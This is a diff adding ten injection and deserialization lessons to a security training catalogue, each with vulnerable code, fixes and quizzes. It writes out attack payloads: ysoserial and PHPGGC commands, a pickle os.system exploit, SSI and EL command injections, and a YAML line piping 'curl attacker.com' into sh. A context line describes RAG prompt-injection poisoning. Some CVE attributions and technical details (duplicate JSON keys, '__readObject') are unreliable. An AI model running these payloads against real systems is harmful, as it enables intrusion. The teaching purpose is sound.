@@ -2989,5 +2989,1140 @@ export const labsData: LabData[] = [
         "answer": "An attacker uploads a document into a vector database containing hidden instructions. When a victim queries the RAG system, the vector search retrieves the document, and the LLM executes the injected commands."
       }
     ]
+  },
+  {
+    "id": 56,
+    "slug": "java-deserialization",
+    "title": "Java Deserialization Injection",
+    "category": "Deserialization & Object Injection",
+    "family": "DESERi",
+    "severity": "Critical",
+    "cvss": 9.8,
+    "cwe": "CWE-502",
+    "owasp": "A08:2021 – Insecure Deserialization",
+    "shortDescription": "Crafted Java serialized objects exploiting gadget chains in common libraries to achieve unauthenticated Remote Code Execution.",
+    "tags": ["deserialization", "java", "gadget-chain", "rce"],
+    "theory": "Java deserialization attacks abuse ObjectInputStream.readObject() which, when fed attacker-controlled binary data, invokes magic methods (__readObject, readResolve) on any class in the JVM classpath. Libraries like Apache Commons Collections expose 'gadget chains' — sequences of method calls that ultimately execute arbitrary OS commands. No source code modification is needed; the vulnerability is the act of deserializing untrusted data.",
+    "howItWorks": "1. Attacker identifies an endpoint accepting base64-encoded serialized Java objects (cookies, parameters, API bodies).\n2. Using ysoserial tool, attacker generates a payload: java -jar ysoserial.jar CommonsCollections6 'id' | base64.\n3. Serialized blob is sent to the vulnerable endpoint.\n4. Server's ObjectInputStream.readObject() processes the blob, triggering the gadget chain.\n5. OS command executes with application server privileges — full RCE achieved.",
+    "impact": "• Unauthenticated Remote Code Execution\n• Full server compromise and lateral movement\n• Data exfiltration and persistent backdoor installation",
+    "realWorldCVE": {
+      "id": "CVE-2015-4852",
+      "description": "Apache Commons Collections deserialization gadget chain enabled unauthenticated RCE on Oracle WebLogic, JBoss, Jenkins, and IBM WebSphere servers worldwide.",
+      "year": 2015
+    },
+    "codeExample": {
+      "language": "java",
+      "vulnerable": "// ❌ VULNERABLE: Deserializing untrusted input directly\nimport java.io.*;\npublic class UserLoader {\n  public Object loadUser(byte[] data) throws Exception {\n    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));\n    return ois.readObject(); // ← Executes gadget chain in untrusted data\n  }\n}",
+      "secure": "// ✅ SECURE: Use JSON with strict schema validation instead\nimport com.fasterxml.jackson.databind.ObjectMapper;\npublic class UserLoader {\n  private static final ObjectMapper mapper = new ObjectMapper();\n  public User loadUser(String json) throws Exception {\n    return mapper.readValue(json, User.class); // Schema-bound, no arbitrary class loading\n  }\n}"
+    },
+    "mitigation": [
+      "Replace ObjectInputStream deserialization with JSON/XML schema-bound parsing",
+      "Apply JEP 290 ObjectInputFilter to allowlist only expected classes",
+      "Use SerialKiller or Contrast Security to block known gadget library classes at runtime"
+    ],
+    "quiz": [
+      {
+        "question": "What makes Java deserialization dangerous even without direct code injection?",
+        "options": [
+          "It requires root privileges",
+          "Existing classes in the classpath form gadget chains that execute OS commands during readObject()",
+          "It only affects web sockets",
+          "It requires a custom ClassLoader"
+        ],
+        "correctIndex": 1,
+        "explanation": "Gadget chains in libraries like Apache Commons Collections chain existing method calls to execute arbitrary code when readObject() processes attacker-supplied bytes."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How does a Java deserialization gadget chain work?",
+        "answer": "A gadget chain is a sequence of method invocations across existing classes in the classpath. When readObject() processes crafted bytes, it triggers magic methods (__readObject, compareTo, hashCode) that chain together to eventually call Runtime.exec() or similar — achieving RCE without any custom class being needed."
+      }
+    ]
+  },
+  {
+    "id": 57,
+    "slug": "php-unserialize-injection",
+    "title": "PHP Object Injection (unserialize())",
+    "category": "Deserialization & Object Injection",
+    "family": "DESERi",
+    "severity": "Critical",
+    "cvss": 9.8,
+    "cwe": "CWE-502",
+    "owasp": "A08:2021 – Insecure Deserialization",
+    "shortDescription": "PHP unserialize() on attacker-controlled input triggers magic methods (__wakeup, __destruct) enabling RCE via POP gadget chains.",
+    "tags": ["php", "unserialize", "object-injection", "pop-chain"],
+    "theory": "PHP's unserialize() function reconstructs objects from serialized strings of the form O:8:\"stdClass\":0:{}. During reconstruction, __wakeup() and __destruct() magic methods execute automatically. By crafting serialized strings that reference classes already loaded in the application (POP chains — Property Oriented Programming), attackers achieve arbitrary code execution without uploading any files.",
+    "howItWorks": "1. Attacker identifies a PHP endpoint that calls unserialize() on user input (cookie, parameter, session).\n2. Using PHPGGC tool, attacker generates a POP chain: phpggc Laravel/RCE1 system id | base64.\n3. Serialized payload is submitted to the vulnerable parameter.\n4. PHP reconstructs the object, triggering __wakeup() which chains to __destruct().\n5. Destructor executes the OS command — RCE achieved via application server.",
+    "impact": "• Remote Code Execution through POP gadget chains\n• File write enabling web shell upload\n• Authentication bypass via forged session objects",
+    "realWorldCVE": {
+      "id": "CVE-2019-9787",
+      "description": "WordPress CSRF + PHP object injection via unserialize() in the comments endpoint enabled authenticated RCE on millions of WordPress installations.",
+      "year": 2019
+    },
+    "codeExample": {
+      "language": "php",
+      "vulnerable": "<?php\n// ❌ VULNERABLE: Unserializing user-controlled cookie\n$userData = unserialize(base64_decode($_COOKIE['user']));\necho 'Welcome, ' . $userData->name;\n// Attacker sends: O:4:\"Evil\":1:{s:4:\"file\";s:14:\"/var/www/shell\";}\n// Evil::__destruct() writes a web shell",
+      "secure": "<?php\n// ✅ SECURE: Use JSON with type-safe deserialization\n$userData = json_decode(base64_decode($_COOKIE['user']), true);\nif (!is_array($userData) || !isset($userData['name'])) {\n  die('Invalid session');\n}\n$name = htmlspecialchars($userData['name'], ENT_QUOTES, 'UTF-8');\necho 'Welcome, ' . $name;"
+    },
+    "mitigation": [
+      "Replace unserialize() with json_decode() for all data transport",
+      "Use unserialize($data, ['allowed_classes' => false]) if unavoidable",
+      "HMAC-sign all serialized data and verify signature before deserializing"
+    ],
+    "quiz": [
+      {
+        "question": "What PHP magic method is most commonly abused in PHP Object Injection?",
+        "options": ["__construct()", "__toString()", "__destruct() and __wakeup()", "__sleep()"],
+        "correctIndex": 2,
+        "explanation": "__destruct() and __wakeup() execute automatically during object lifecycle, making them the primary gadget entry points in POP chains triggered by unserialize()."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How does a PHP POP chain differ from a traditional exploit?",
+        "answer": "A POP (Property Oriented Programming) chain uses existing application classes and their magic methods as gadgets. No new code is uploaded — the attacker crafts a serialized object whose properties chain existing class methods together, ultimately calling system() or file_put_contents() through normal PHP object lifecycle callbacks."
+      }
+    ]
+  },
+  {
+    "id": 58,
+    "slug": "dotnet-viewstate-injection",
+    "title": ".NET ViewState Injection",
+    "category": "Deserialization & Object Injection",
+    "family": "DESERi",
+    "severity": "Critical",
+    "cvss": 9.0,
+    "cwe": "CWE-502",
+    "owasp": "A08:2021 – Insecure Deserialization",
+    "shortDescription": "Forged ASP.NET ViewState exploiting exposed or weak machineKey values to achieve Remote Code Execution on postback.",
+    "tags": ["dotnet", "aspnet", "viewstate", "machinekey", "deserialization"],
+    "theory": "ASP.NET WebForms uses ViewState — a hidden __VIEWSTATE field containing a base64-encoded, binary-serialized representation of page state. When enableViewStateMac is true, this is integrity-protected with a machineKey HMAC. If the machineKey is known (leaked from web.config, using a default value, or disabled), attackers can forge arbitrary .NET serialized ViewState that triggers RCE via ObjectStateFormatter gadget chains when the server processes the postback.",
+    "howItWorks": "1. Attacker obtains the machineKey (from leaked web.config, default values, or CVE-2020-0688).\n2. Using ysoserial.net: ysoserial.exe -p ViewState -g TextFormattingRunProperties -c 'id' --validationkey=<machineKey>.\n3. Crafted __VIEWSTATE is submitted in a POST request to any ASPX page.\n4. ASP.NET validates the MAC (passes, key is known) then deserializes the payload.\n5. RCE executes with IIS application pool identity.",
+    "impact": "• Remote Code Execution with IIS AppPool privileges\n• Full server compromise via hardcoded or leaked machineKey\n• Lateral movement within .NET application infrastructure",
+    "realWorldCVE": {
+      "id": "CVE-2020-0688",
+      "description": "Microsoft Exchange Server used a static validationKey in web.config, allowing authenticated attackers to forge ViewState and achieve SYSTEM-level RCE on all Exchange servers.",
+      "year": 2020
+    },
+    "codeExample": {
+      "language": "csharp",
+      "vulnerable": "<!-- ❌ VULNERABLE: Static machineKey in web.config -->\n<system.web>\n  <machineKey validationKey=\"HARDCODED_KEY_HERE\"\n              decryptionKey=\"HARDCODED_DECRYPTION_KEY\"\n              validation=\"SHA1\" />\n</system.web>",
+      "secure": "<!-- ✅ SECURE: Auto-generated machineKey per deployment -->\n<system.web>\n  <!-- Do NOT hardcode machineKey — let IIS generate per app pool -->\n  <pages enableViewStateMac=\"true\" viewStateEncryptionMode=\"Always\" />\n</system.web>\n// Also: Migrate from WebForms to ASP.NET Core (no ViewState)"
+    },
+    "mitigation": [
+      "Never hardcode machineKey values — use auto-generated or DPAPI-protected keys",
+      "Enable viewStateEncryptionMode='Always' to encrypt ViewState in addition to MAC",
+      "Migrate from ASP.NET WebForms to ASP.NET Core which has no ViewState"
+    ],
+    "quiz": [
+      {
+        "question": "What is the primary precondition for exploiting .NET ViewState injection?",
+        "options": [
+          "Admin credentials",
+          "Knowledge of the machineKey used to sign ViewState",
+          "Direct database access",
+          "A custom DLL upload"
+        ],
+        "correctIndex": 1,
+        "explanation": "The machineKey is used to generate the HMAC signature on ViewState. If it is known (hardcoded, leaked, or default), an attacker can forge a valid malicious ViewState that passes MAC validation and triggers deserialization RCE."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How did CVE-2020-0688 exploit .NET ViewState?",
+        "answer": "Microsoft Exchange Server shipped with a static, hardcoded validationKey in its web.config. Any authenticated user could use ysoserial.net to craft a malicious ViewState blob, submit it to any Exchange ASPX endpoint, and achieve SYSTEM-level RCE — since the HMAC check passed with the known key before the dangerous deserialization occurred."
+      }
+    ]
+  },
+  {
+    "id": 59,
+    "slug": "python-pickle-injection",
+    "title": "Python Pickle Injection",
+    "category": "Deserialization & Object Injection",
+    "family": "DESERi",
+    "severity": "Critical",
+    "cvss": 9.8,
+    "cwe": "CWE-502",
+    "owasp": "A08:2021 – Insecure Deserialization",
+    "shortDescription": "Python pickle.loads() on untrusted data executes arbitrary __reduce__ methods, enabling instant Remote Code Execution via REDUCE opcode.",
+    "tags": ["python", "pickle", "deserialization", "rce", "ml"],
+    "theory": "Python's pickle module uses a stack-based virtual machine with opcodes. The REDUCE opcode calls any callable with arbitrary arguments during unpickling. By crafting a pickle payload that uses REDUCE to call os.system or subprocess.Popen, attackers achieve arbitrary code execution. No gadget chains are needed — pickle natively supports calling any Python callable. Machine learning model files (model.pkl) are particularly high-risk.",
+    "howItWorks": "1. Attacker crafts: class Exploit: def __reduce__(self): return (os.system, ('id',))\n2. Payload: base64.b64encode(pickle.dumps(Exploit())).decode()\n3. Crafted base64 sent to endpoint calling pickle.loads() on user input.\n4. Server unpickles the object, invoking __reduce__ which calls os.system('id').\n5. Command executes immediately.",
+    "impact": "• Instant RCE with application process privileges\n• ML model poisoning leading to code execution at inference time\n• Data pipeline compromise via malicious model files",
+    "realWorldCVE": {
+      "id": "CVE-2022-21699",
+      "description": "IPython arbitrary code execution via pickle deserialization of untrusted profile configuration files, affecting Jupyter Notebook deployments.",
+      "year": 2022
+    },
+    "codeExample": {
+      "language": "python",
+      "vulnerable": "# ❌ VULNERABLE: Unpickling user-controlled data\nimport pickle, base64\nfrom flask import request\n\n@app.route('/load-model')\ndef load_model():\n    data = base64.b64decode(request.args['model'])\n    model = pickle.loads(data)  # ← RCE via __reduce__\n    return model.predict([1, 2, 3])",
+      "secure": "# ✅ SECURE: Use safetensors for ML model exchange\nfrom safetensors import safe_open\nfrom flask import request\n\n@app.route('/load-model')\ndef load_model():\n    model_path = validate_model_path(request.args['model_name'])\n    with safe_open(model_path, framework='pt') as f:\n        tensors = {k: f.get_tensor(k) for k in f.keys()}\n    return run_inference(tensors)"
+    },
+    "mitigation": [
+      "Never use pickle.loads() on untrusted data — use json.loads() or msgpack instead",
+      "For ML models, use ONNX or safetensors formats which prohibit arbitrary code execution",
+      "If pickle is unavoidable, run deserialization in a sandboxed subprocess with restricted OS permissions"
+    ],
+    "quiz": [
+      {
+        "question": "What Python pickle opcode enables arbitrary code execution?",
+        "options": ["BUILD", "REDUCE", "MARK", "APPENDS"],
+        "correctIndex": 1,
+        "explanation": "The REDUCE opcode calls a Python callable with given arguments during unpickling. Attackers craft __reduce__() to return (os.system, ('id',)), causing immediate OS command execution when unpickled."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "Why are machine learning pickle files particularly dangerous?",
+        "answer": "ML model files (model.pkl, sklearn pipelines) are shared via model repositories without integrity validation. Loading a poisoned .pkl file executes the attacker's __reduce__ payload with the inference process's privileges — which often has access to GPU credentials, cloud APIs, and proprietary training data."
+      }
+    ]
+  },
+  {
+    "id": 60,
+    "slug": "el-injection-java",
+    "title": "Expression Language (EL) Injection (Java EE)",
+    "category": "Expression & Template Injection",
+    "family": "ELi",
+    "severity": "Critical",
+    "cvss": 9.0,
+    "cwe": "CWE-917",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "User-controlled EL expressions evaluated by JSP/JSF engine gain access to server runtime, beans, and OS command execution.",
+    "tags": ["java", "el", "jsf", "jsp", "expression-language"],
+    "theory": "Java EE Unified Expression Language (EL) allows embedding expressions like ${bean.property} in JSP/JSF pages. When user input is embedded in EL contexts without sanitization, attackers access application-scoped objects, session data, and invoke java.lang.Runtime.exec() for OS command execution via EL's implicit objects.",
+    "howItWorks": "1. Identify a JSP/JSF page reflecting user input: ?name=${attacker_expr}.\n2. Submit: ?name=${Runtime.getRuntime().exec('id')}.\n3. JSF/JSP engine evaluates the expression during page rendering.\n4. Runtime.exec() is invoked, executing the OS command.\n5. Output appears in page or requires blind detection via time delay.",
+    "impact": "• Remote Code Execution via JSP/JSF engine\n• Exposure of all application-scoped beans and session objects\n• Authentication bypass via access to security context objects",
+    "realWorldCVE": {
+      "id": "CVE-2011-2730",
+      "description": "Spring Framework EL injection via @Value annotations allowed unauthorized access to Spring context beans and potential RCE in Spring MVC applications.",
+      "year": 2011
+    },
+    "codeExample": {
+      "language": "java",
+      "vulnerable": "<%-- ❌ VULNERABLE: User input directly in EL context --%>\n<%@ page contentType=\"text/html\" %>\n<html><body>\n  Welcome, ${param.name}!\n  <%-- name=${Runtime.getRuntime().exec('id')} executes OS command --%>\n</body></html>",
+      "secure": "<%-- ✅ SECURE: Use JSTL fn:escapeXml() --%>\n<%@ taglib prefix=\"fn\" uri=\"http://java.sun.com/jsp/jstl/functions\" %>\n<html><body>\n  Welcome, ${fn:escapeXml(param.name)}!\n</body></html>"
+    },
+    "mitigation": [
+      "Always escape user input before embedding in EL contexts using fn:escapeXml()",
+      "Use EL 3.0+ with a restricted EvaluationContext that denies access to reflection APIs",
+      "Reject ${, #{, and %{ character sequences in all user-controlled input"
+    ],
+    "quiz": [
+      {
+        "question": "What makes EL injection dangerous beyond data disclosure?",
+        "options": [
+          "It can delete CSS files",
+          "EL can invoke Java reflection APIs granting access to Runtime.exec() for OS command execution",
+          "It only affects JSP comments",
+          "It requires a database connection"
+        ],
+        "correctIndex": 1,
+        "explanation": "Java EL's implicit objects and reflection capabilities allow accessing java.lang.Runtime, enabling arbitrary OS command execution — not just bean data disclosure."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How does EL injection differ from XSS?",
+        "answer": "XSS executes JavaScript client-side in the victim's browser. EL injection executes Java expressions on the server during JSP/JSF rendering — achieving server-side RCE rather than client-side script injection, with much higher impact."
+      }
+    ]
+  },
+  {
+    "id": 61,
+    "slug": "ognl-injection",
+    "title": "OGNL Injection (Apache Struts)",
+    "category": "Expression & Template Injection",
+    "family": "ELi",
+    "severity": "Critical",
+    "cvss": 10.0,
+    "cwe": "CWE-917",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "Apache Struts 2 OGNL expression injection via HTTP parameters or Content-Type headers enables unauthenticated RCE (CVE-2017-5638).",
+    "tags": ["struts", "ognl", "java", "rce", "equifax"],
+    "theory": "OGNL (Object-Graph Navigation Language) is used by Apache Struts 2 to bind HTTP parameters to action class properties. When the expression evaluator processes attacker-supplied input without context restrictions, it gains access to Java reflection APIs enabling arbitrary class instantiation and OS command execution.",
+    "howItWorks": "1. Attacker sends HTTP request with malicious OGNL expression in Content-Type header.\n2. Struts 2 error handling evaluates the Content-Type as OGNL.\n3. OGNL bypasses member access restrictions via #_memberAccess manipulation.\n4. ProcessBuilder instantiated with attacker command.\n5. OS command executes — no authentication required.",
+    "impact": "• Unauthenticated RCE on any Struts 2 application (pre-2.5.13)\n• The Equifax breach exposed 147 million records via this CVE\n• Full server compromise without credentials",
+    "realWorldCVE": {
+      "id": "CVE-2017-5638",
+      "description": "Apache Struts2 S2-045 — unauthenticated RCE via OGNL injection in Content-Type header. Exploited in the Equifax breach exposing 147 million records.",
+      "year": 2017
+    },
+    "codeExample": {
+      "language": "java",
+      "vulnerable": "// ❌ VULNERABLE: Struts 2 before 2.5.13 — OGNL evaluated in Content-Type\n// Any struts.xml action mapping is vulnerable:\n<action name=\"upload\" class=\"com.example.UploadAction\">\n  <result>/upload-success.jsp</result>\n</action>\n// Attacker: Content-Type: %{(#cmd='id').(#p=new ProcessBuilder(#cmd))...}",
+      "secure": "// ✅ SECURE: Upgrade Struts2 and restrict OGNL context\n// 1. Upgrade to Struts >= 2.5.33\n<constant name=\"struts.excludedClasses\"\n  value=\"java.lang.Runtime,java.lang.ProcessBuilder\" />\n<constant name=\"struts.allowStaticMethodAccess\" value=\"false\" />"
+    },
+    "mitigation": [
+      "Upgrade Apache Struts2 to version 2.5.33 or later immediately",
+      "Disable static method access: struts.allowStaticMethodAccess=false",
+      "Apply WAF rules blocking OGNL metacharacters (%{, @, #) in all HTTP headers"
+    ],
+    "quiz": [
+      {
+        "question": "Which real-world breach directly resulted from CVE-2017-5638?",
+        "options": ["Sony Pictures hack", "Equifax data breach", "Yahoo email compromise", "Target POS breach"],
+        "correctIndex": 1,
+        "explanation": "The 2017 Equifax breach exposed 147 million records. Attackers exploited CVE-2017-5638 on an unpatched Equifax server — a patch had been available for two months before the attack."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "Why was the Equifax breach so severe, and what should organizations learn?",
+        "answer": "Equifax failed to patch a critical CVE for 78 days after it was available. The lesson: establish SLAs for critical CVE patching (24-48 hours for CVSS 10.0), use SCA tools to detect vulnerable dependencies, and apply WAF virtual patching while permanent fixes deploy."
+      }
+    ]
+  },
+  {
+    "id": 62,
+    "slug": "ssi-injection-advanced",
+    "title": "Server-Side Includes (SSI) Injection",
+    "category": "Expression & Template Injection",
+    "family": "ELi",
+    "severity": "High",
+    "cvss": 7.5,
+    "cwe": "CWE-97",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "SSI directives injected via content parameters in .shtml pages execute OS commands or include arbitrary server files.",
+    "tags": ["ssi", "apache", "server-side-includes", "rce"],
+    "theory": "Server-Side Includes (SSI) is an Apache/Nginx feature for .shtml pages processing <!--#exec cmd='id'--> directives. When user input is reflected into SSI-enabled pages without HTML encoding, attackers inject directives to execute OS commands or include server files.",
+    "howItWorks": "1. Target application runs on SSI-enabled server with .shtml pages.\n2. User input is reflected without encoding.\n3. Attacker submits: <!--#exec cmd='id' -->.\n4. Apache processes the SSI directive during page serving.\n5. Command output embedded in HTML response — RCE confirmed.",
+    "impact": "• OS command execution with web server privileges\n• Arbitrary file inclusion (<!--#include virtual='/etc/passwd' -->)\n• Server fingerprinting and information disclosure",
+    "realWorldCVE": {
+      "id": "CVE-2021-41773",
+      "description": "Apache HTTP Server 2.4.49 path traversal combined with SSI processing allowed unauthenticated RCE when mod_cgi was enabled.",
+      "year": 2021
+    },
+    "codeExample": {
+      "language": "html",
+      "vulnerable": "<!-- ❌ VULNERABLE: User input reflected in .shtml page -->\n<html><body>\n  Hello, <!--#echo var=\"QUERY_STRING\" -->\n  <!-- Attacker: name=<!--%23exec+cmd='id'+--> -->\n</body></html>",
+      "secure": "<!-- ✅ SECURE: Disable SSI -->\n# /etc/apache2/apache2.conf\n<Directory /var/www/html>\n  Options -Includes  # Disable SSI entirely\n</Directory>"
+    },
+    "mitigation": [
+      "Disable SSI processing (Options -Includes) in Apache config for all user-facing directories",
+      "HTML-encode all user input before output — never reflect raw content in .shtml pages",
+      "Migrate to modern server-side frameworks with auto-escaping (Flask, Express, Spring MVC)"
+    ],
+    "quiz": [
+      {
+        "question": "What is the SSI directive syntax for executing an OS command?",
+        "options": [
+          "<% Runtime.exec('id') %>",
+          "<!--#exec cmd='id' -->",
+          "{{os.system('id')}}",
+          "${exec('id')}"
+        ],
+        "correctIndex": 1,
+        "explanation": "SSI uses HTML comment syntax <!--#directive ... --> processed by Apache/Nginx when SSI is enabled. The #exec directive runs arbitrary OS commands."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How do you identify if a site is SSI-enabled during reconnaissance?",
+        "answer": "Look for .shtml, .shtm, or .stm file extensions. Test with <!--#echo var='DATE_LOCAL' --> — if the server returns the current date/time, SSI is enabled and the page reflects user input without encoding."
+      }
+    ]
+  },
+  {
+    "id": 63,
+    "slug": "json-injection",
+    "title": "JSON Injection",
+    "category": "Data Format Injection",
+    "family": "DATAFMTi",
+    "severity": "High",
+    "cvss": 7.5,
+    "cwe": "CWE-74",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "User-supplied values injected into JSON structures via string concatenation allow privilege escalation and data manipulation.",
+    "tags": ["json", "injection", "api", "privilege-escalation"],
+    "theory": "JSON injection occurs when user-controlled values are embedded in JSON via string concatenation. Attackers inject JSON metacharacters (quotes, colons, braces) to break out of the expected string value and add new key-value pairs — overriding existing fields, injecting privilege flags, or altering API request structures.",
+    "howItWorks": "1. Application builds JSON: '{\"name\":\"' + userInput + '\",\"role\":\"user\"}'.\n2. Attacker submits: alice\",\"role\":\"admin\".\n3. Final JSON: {\"name\":\"alice\",\"role\":\"admin\",\"role\":\"user\"}.\n4. Parser uses first 'role' value ('admin').\n5. Privilege escalation achieved.",
+    "impact": "• Privilege escalation by injecting role/admin fields\n• Data structure manipulation in API requests\n• JSON-based log injection bypassing security monitoring",
+    "realWorldCVE": {
+      "id": "CVE-2018-1000553",
+      "description": "JSON injection in node-jsonfile via string concatenation allowed injection of additional JSON properties, affecting npm packages with millions of weekly downloads.",
+      "year": 2018
+    },
+    "codeExample": {
+      "language": "javascript",
+      "vulnerable": "// ❌ VULNERABLE: Building JSON by string concatenation\napp.post('/register', (req, res) => {\n  const name = req.body.name;\n  const jsonPayload = '{\"name\":\"' + name + '\",\"role\":\"user\"}';\n  const user = JSON.parse(jsonPayload); // Attacker: alice\",\"role\":\"admin\n  db.createUser(user);\n});",
+      "secure": "// ✅ SECURE: Use proper JSON serialization\napp.post('/register', (req, res) => {\n  const name = req.body.name;\n  const user = { name: name, role: 'user' }; // role set programmatically\n  db.createUser(user); // JSON.stringify on the way out handles escaping\n});"
+    },
+    "mitigation": [
+      "Always use JSON.stringify() — never build JSON via string concatenation",
+      "Validate JSON structure against a strict schema (JSON Schema, AJV) before processing",
+      "Set security-sensitive fields (role, isAdmin) programmatically — never from user input"
+    ],
+    "quiz": [
+      {
+        "question": "What makes JSON injection possible in most vulnerable implementations?",
+        "options": [
+          "Using parseInt() on user input",
+          "String concatenation to build JSON instead of using a proper serializer",
+          "Missing HTTPS",
+          "Using req.body directly"
+        ],
+        "correctIndex": 1,
+        "explanation": "String concatenation allows attackers to inject JSON metacharacters that break out of the string value and inject new JSON properties — a serializer like JSON.stringify() escapes these automatically."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How does JSON injection lead to privilege escalation?",
+        "answer": "If an application builds JSON via concatenation, an attacker injects a closing quote and adds new key-value pairs. The injected field (e.g., 'role':'admin') may override the legitimate field depending on the JSON parser's duplicate key handling — granting elevated privileges."
+      }
+    ]
+  },
+  {
+    "id": 64,
+    "slug": "yaml-injection",
+    "title": "YAML Injection",
+    "category": "Data Format Injection",
+    "family": "DATAFMTi",
+    "severity": "Critical",
+    "cvss": 9.8,
+    "cwe": "CWE-502",
+    "owasp": "A08:2021 – Insecure Deserialization",
+    "shortDescription": "Unsafe YAML loaders (yaml.load, SnakeYAML) execute arbitrary code via !!python/object type tags in attacker-controlled YAML input.",
+    "tags": ["yaml", "deserialization", "rce", "python", "java"],
+    "theory": "YAML supports type tags (!!python/object, !!java.lang.Runtime) that instruct the deserializer to construct specific objects. Unsafe YAML loaders process these tags and instantiate arbitrary classes during parsing — achieving RCE. CI/CD pipelines, configuration APIs, and Kubernetes manifest processors are common attack surfaces.",
+    "howItWorks": "1. Identify endpoint parsing user-supplied YAML using unsafe loader.\n2. Craft: !!python/object/apply:os.system ['id'].\n3. Submit as YAML body or config value.\n4. Unsafe loader calls os.system('id').\n5. Command executes during YAML parsing — before application logic runs.",
+    "impact": "• Instant RCE during YAML parsing\n• CI/CD pipeline compromise via malicious manifest files\n• Kubernetes cluster takeover via crafted YAML resources",
+    "realWorldCVE": {
+      "id": "CVE-2022-1471",
+      "description": "SnakeYAML deserialization via Yaml() constructor allowed RCE in Java applications using SnakeYAML, affecting Spring Boot and other frameworks.",
+      "year": 2022
+    },
+    "codeExample": {
+      "language": "python",
+      "vulnerable": "# ❌ VULNERABLE: yaml.load() without safe Loader\nimport yaml\nfrom flask import request\n\n@app.route('/config', methods=['POST'])\ndef update_config():\n    config = yaml.load(request.data, Loader=yaml.Loader)  # Unsafe!\n    # Attacker: !!python/object/apply:os.system ['curl attacker.com | sh']\n    return apply_config(config)",
+      "secure": "# ✅ SECURE: Use yaml.safe_load() exclusively\nimport yaml\nfrom flask import request\n\n@app.route('/config', methods=['POST'])\ndef update_config():\n    config = yaml.safe_load(request.data)  # Blocks !! type tags\n    if not isinstance(config, dict):\n        return 'Invalid config', 400\n    return apply_config(config)"
+    },
+    "mitigation": [
+      "Use yaml.safe_load() in Python, SafeConstructor in SnakeYAML, Psych.safe_load in Ruby — never the unsafe loader",
+      "Validate YAML structure against a strict schema before processing",
+      "Treat all externally sourced YAML (CI configs, Helm charts, K8s manifests) as untrusted"
+    ],
+    "quiz": [
+      {
+        "question": "What YAML feature enables code execution in unsafe loaders?",
+        "options": [
+          "YAML anchors (&alias)",
+          "YAML type tags (!!python/object, !!java.lang.Runtime)",
+          "Multi-line strings (|)",
+          "YAML comments (#)"
+        ],
+        "correctIndex": 1,
+        "explanation": "YAML type tags instruct unsafe loaders to instantiate specific classes during parsing. !!python/object/apply:os.system is processed by PyYAML's unsafe loader, calling os.system() before any application code runs."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "Why is YAML injection particularly dangerous in DevOps environments?",
+        "answer": "CI/CD pipelines and Kubernetes controllers parse YAML from external sources without integrity validation. A single malicious commit or chart file can execute code with pipeline/cluster admin privileges — compromising the entire software supply chain."
+      }
+    ]
+  },
+  {
+    "id": 65,
+    "slug": "xml-billion-laughs",
+    "title": "XML Entity Expansion (Billion Laughs DoS)",
+    "category": "Data Format Injection",
+    "family": "DATAFMTi",
+    "severity": "High",
+    "cvss": 7.5,
+    "cwe": "CWE-776",
+    "owasp": "A05:2021 – Security Misconfiguration",
+    "shortDescription": "Nested XML entity definitions cause exponential memory expansion, exhausting server resources and causing Denial of Service.",
+    "tags": ["xml", "dos", "entity-expansion", "billion-laughs"],
+    "theory": "The Billion Laughs attack exploits XML's entity reference mechanism. Entities referencing other entities in an exponential chain expand a 1KB input to gigabytes in memory — consuming server RAM and causing DoS. Unlike XXE (reads files), Billion Laughs targets availability.",
+    "howItWorks": "1. Attacker sends XML with nested entity definitions to any XML endpoint.\n2. Parser resolves &lol9; → 10 copies of &lol8; → 10 copies of &lol7; → ... exponential growth.\n3. Memory: 10^9 repetitions of 'lol' = ~3GB RAM.\n4. Server OOM kill or crash.\n5. No authentication required.",
+    "impact": "• Denial of Service — server crash or OOM kill\n• Service unavailability affecting all users\n• No authentication required for exploitation",
+    "realWorldCVE": {
+      "id": "CVE-2003-1564",
+      "description": "libxml2 billion laughs vulnerability enabling DoS via exponentially nested entity expansion, affecting XML parsers in PHP, Python, and Ruby.",
+      "year": 2003
+    },
+    "codeExample": {
+      "language": "python",
+      "vulnerable": "# ❌ VULNERABLE: XML parser with DTD processing enabled\nfrom lxml import etree\nfrom flask import request\n\n@app.route('/parse-xml', methods=['POST'])\ndef parse_xml():\n    tree = etree.fromstring(request.data)  # Billion laughs causes OOM\n    return process(tree)",
+      "secure": "# ✅ SECURE: Use defusedxml to block entity expansion\nimport defusedxml.ElementTree as ET\nfrom flask import request\n\n@app.route('/parse-xml', methods=['POST'])\ndef parse_xml():\n    tree = ET.fromstring(request.data)  # Blocks DTD, XXE, and entity expansion\n    return process(tree)"
+    },
+    "mitigation": [
+      "Use defusedxml in Python or set FEATURE_SECURE_PROCESSING=true in Java's XMLInputFactory",
+      "Disable DTD processing: setFeature(DISALLOW_DOCTYPE_DECL, true) in Java",
+      "Apply request body size limits and timeouts to all XML processing endpoints"
+    ],
+    "quiz": [
+      {
+        "question": "How does Billion Laughs differ from XXE injection?",
+        "options": [
+          "Billion Laughs requires authentication",
+          "Billion Laughs targets availability via memory exhaustion; XXE targets confidentiality via file reading",
+          "Billion Laughs only works on JSON",
+          "XXE is more dangerous"
+        ],
+        "correctIndex": 1,
+        "explanation": "Billion Laughs causes DoS through exponential entity expansion consuming server memory. XXE reads local files or makes SSRF requests. Both exploit XML entity processing but with different impacts."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How would you fix an XML parser vulnerable to Billion Laughs?",
+        "answer": "Configure the parser with security features: Java: XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES=false and FEATURE_SECURE_PROCESSING=true. Python: use defusedxml. .NET: XmlReaderSettings.DtdProcessing=DtdProcessing.Prohibit. These block DTD entity expansion while preserving normal XML parsing."
+      }
+    ]
+  },
+  {
+    "id": 66,
